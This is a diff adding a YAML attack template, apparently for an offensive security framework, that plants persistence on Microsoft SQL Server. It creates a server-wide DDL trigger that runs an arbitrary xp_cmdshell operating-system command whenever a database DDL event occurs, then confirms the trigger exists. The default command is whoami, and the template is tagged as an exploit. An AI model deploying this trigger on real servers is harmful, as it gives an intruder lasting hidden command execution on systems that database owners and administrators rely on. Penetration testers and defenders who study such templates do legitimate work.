@@ -1,0 +1,26 @@
+id: mssql-ddl-trigger-persist
+service: [mssql]
+variables:
+  trigger_name: zombie_ddl_trigger
+  cmd: whoami
+info:
+  name: MSSQL DDL Trigger Persistence
+  severity: critical
+  tags: mssql,exploit,persist,trigger
+
+services:
+  - ops:
+      - db: "CREATE TRIGGER [{{trigger_name}}] ON ALL SERVER FOR DDL_DATABASE_EVENTS AS EXEC xp_cmdshell '{{cmd}}'"
+        name: trigger_create
+      - db: "SELECT 'trigger_exists=' + CASE WHEN EXISTS (SELECT 1 FROM sys.server_triggers WHERE name = '{{trigger_name}}') THEN 'yes' ELSE 'no' END"
+        name: trigger_status
+    matchers:
+      - type: word
+        part: trigger_status
+        words: ["trigger_exists=yes"]
+    extractors:
+      - type: regex
+        name: mssql_ddl_trigger_status
+        part: trigger_status
+        regex: ['(?m)^trigger_exists=(yes|no)']
+        group: 1
